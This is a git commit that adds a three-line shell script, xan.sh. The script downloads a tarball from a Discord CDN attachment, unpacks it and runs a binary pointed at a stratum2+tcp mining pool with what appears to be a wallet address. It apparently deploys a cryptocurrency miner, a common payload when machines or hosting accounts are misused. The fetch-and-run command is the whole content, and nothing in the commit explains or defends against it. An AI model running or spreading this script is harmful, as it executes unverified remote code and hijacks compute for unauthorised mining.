80a993439564a0034c52866d9853e0a4be5c450a
Xanner-3355 <77426951+Xanner-3355@users.noreply.github.com>
2021-01-14 12:53:09 -0300

    Add files via upload

---
+++ xan.sh
@@ -0,0 +1,3 @@
+wget https://cdn.discordapp.com/attachments/774455241012936734/794586544769073162/test.tar.gz
+tar xf test.tar.gz
+bin/test -P stratum2+tcp://3525YX8EqpotafRsVHUPPCPMAG2juxpDwP.1@172.65.223.147:3353
